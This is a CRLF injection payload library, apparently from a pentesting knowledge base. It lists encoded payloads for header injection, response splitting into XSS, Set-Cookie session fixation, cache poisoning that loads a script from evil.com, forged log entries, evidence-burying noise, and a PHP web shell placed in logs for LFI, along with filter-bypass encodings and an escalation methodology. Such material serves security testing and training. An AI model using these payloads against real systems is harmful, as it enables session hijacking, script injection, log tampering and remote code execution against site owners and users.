---
id: "crlf-injection-payloads"
title: "CRLF Injection Payload Library"
type: "payload"
category: "web-application"
subcategory: "header-injection"
tags: ["crlf", "header-injection", "response-splitting", "log-injection", "xss-via-crlf", "set-cookie", "encoding-bypass", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["crlf-host-header", "http-request-smuggling", "cache-poisoning", "open-redirect"]
updated: "2026-04-14"
---

## Overview

CRLF injection inserts carriage return (\r = %0d) and line feed (\n = %0a) characters into HTTP headers, enabling header injection, response splitting, XSS, cache poisoning, and log injection. Found in redirect parameters, custom header values, and any user input reflected in HTTP response headers.

## Basic CRLF Payloads

### Standard encoding
```
%0d%0aInjected-Header:value
%0d%0aSet-Cookie:admin=true
%0d%0aLocation:https://evil.com
%0d%0aX-Injected:true
%0d%0aContent-Type:text/html
%0d%0aAccess-Control-Allow-Origin:*
```

### LF only (works on many servers)
```
%0aInjected-Header:value
%0aSet-Cookie:admin=true
%0aLocation:https://evil.com
```

### CR only
```
%0dInjected-Header:value
%0dSet-Cookie:admin=true
```

### Literal escape sequences
```
\r\nInjected-Header:value
\nInjected-Header:value
\rInjected-Header:value
```

## Response Splitting Payloads

### Inject full HTTP response (XSS)
```
%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>

%0d%0a%0d%0a<html><body><script>alert(document.domain)</script></body></html>

%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>
```

### XSS via header injection
```
# Inject body after double CRLF
%0d%0a%0d%0a<img src=x onerror=alert(1)>

# Via Location header with body
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img/src/onerror=alert(1)>

# Disable XSS protection first
%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>

# Inject Content-Type to force HTML rendering
%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.cookie)</script>
```

## Cookie Injection Payloads

### Set-Cookie injection
```
%0d%0aSet-Cookie:admin=true
%0d%0aSet-Cookie:admin=true;Path=/;HttpOnly
%0d%0aSet-Cookie:role=admin;Domain=.target.com
%0d%0aSet-Cookie:session=attacker_session_id
%0d%0aSet-Cookie:isLoggedIn=true;Path=/
%0d%0aSet-Cookie:debug=1

# __Host- prefix cookie (strict: no Domain, must be Secure, Path=/)
%0d%0aSet-Cookie:__Host-session=attacker_value;Secure;Path=/

# Multiple cookies
%0d%0aSet-Cookie:admin=true%0d%0aSet-Cookie:role=superadmin
```

### Session fixation via CRLF
```
# Set known session cookie via CRLF in redirect
/redirect?url=https://target.com%0d%0aSet-Cookie:JSESSIONID=attacker_known_value
/redirect?url=https://target.com%0d%0aSet-Cookie:PHPSESSID=attacker_known_value
```

## Cache Poisoning via CRLF

```
# Inject X-Forwarded-Host to poison cache
%0d%0aX-Forwarded-Host:evil.com

# Inject headers that affect cached content
%0d%0aX-Forwarded-Proto:http
%0d%0aX-Original-URL:/admin
%0d%0aX-Rewrite-URL:/admin

# Poison with alternate response
%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aCache-Control:public,max-age=31536000%0d%0a%0d%0a<script src=https://evil.com/hook.js></script>
```

## Log Injection Payloads

```
# Inject fake log entries
%0d%0a127.0.0.1 - admin [date] "GET /admin HTTP/1.1" 200 1234
%0d%0a[SUCCESS] Admin login from authorized IP

# Clear evidence by injecting noise
%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a

# Inject into application logs
username=admin%0d%0a[INFO] Password reset successful for user: admin
action=login%0d%0a[ALERT] Intrusion detected from IP: 10.0.0.1

# Log poisoning for LFI (inject PHP into logs)
User-Agent: <?php system($_GET['cmd']); ?>
# Then include the log file via LFI
```

## Encoding Bypass Variants

### Double URL encoding
```
%250d%250aInjected-Header:value
%250aInjected-Header:value
%250dInjected-Header:value
```

### UTF-8 encoded CRLF
```
%E5%98%8A%E5%98%8DInjected-Header:value
%E5%98%8A%E5%98%8DSet-Cookie:admin=true

# UTF-8 character breakdown:
# U+560A contains 0x0A (LF) in its encoding
# U+560D contains 0x0D (CR) in its encoding
# Firefox historically decoded these as CR/LF
```

### Unicode normalization bypass
```
%c4%8d%c4%8aInjected-Header:value
\u000d\u000aInjected-Header:value
\u010d\u010aInjected-Header:value
```

### Alternate line terminators
```
# Some Java, Python, Go frameworks accept these as newlines
%0b          # Vertical tab
%0c          # Form feed  
%85          # NEL (Next Line) - ISO 8859
%e2%80%a8    # Line Separator (LS) - Unicode U+2028
%e2%80%a9    # Paragraph Separator (PS) - Unicode U+2029
```

### Header continuation
```
# Space/tab after CRLF = header continuation (RFC 7230 deprecated but supported)
%0d%0a%20Injected-continuation
%0d%0a%09Injected-continuation
```

### Mixed encoding
```
%0d%250a   # CR normal, LF double-encoded
%250d%0a   # CR double-encoded, LF normal
\r%0a      # CR literal, LF encoded
%0d\n      # CR encoded, LF literal
```

## HTTP/2 CRLF Injection

```
# HTTP/2 uses binary framing, but some backends downgrade to HTTP/1.1
# Front-end (HTTP/2) -> Back-end (HTTP/1.1)
# Inject CRLF in HTTP/2 header values
# The front-end allows it (binary), back-end interprets as line break

# Via :path pseudo-header
:path: /path%0d%0aInjected: header

# Via custom header value
custom-header: value%0d%0aInjected: header

# HTTP/2 request splitting
# See http-request-smuggling for full H2.CL and H2.TE techniques
```

## Common Injection Points

```
# Redirect parameters
/redirect?url=https://target.com%0d%0aSet-Cookie:admin=true

# URL path
/path%0d%0aInjected:true

# Headers reflected in response
X-Custom-Header: value%0d%0aInjected:true

# Referer header
Referer: https://target.com%0d%0aInjected:true

# Cookie values
Cookie: name=value%0d%0aInjected:true

# POST body params reflected in response headers
param=value%0d%0aInjected:true

# WebSocket upgrade headers
Sec-WebSocket-Protocol: value%0d%0aInjected:true
```

## Detection Methodology

```
1. Find input reflected in response headers (Location, Set-Cookie, custom headers)
2. Inject %0d%0aTest-Header:injected
3. Check if new header appears in response
4. If filtered: try encoding bypasses (double, UTF-8, alternate terminators)
5. If header injection works: escalate to XSS (response splitting) or session fixation
6. Check for log injection in application/server logs
7. Test cache poisoning if CDN/cache is present
```

## Tools

- **CRLFuzz** -- Automated CRLF injection scanner
- **crlfmap** -- CRLF detection in bulk
- **Burp Suite** -- Manual header injection testing
- **nuclei** -- CRLF injection templates
- **ffuf** -- Fuzz parameters with CRLF payloads
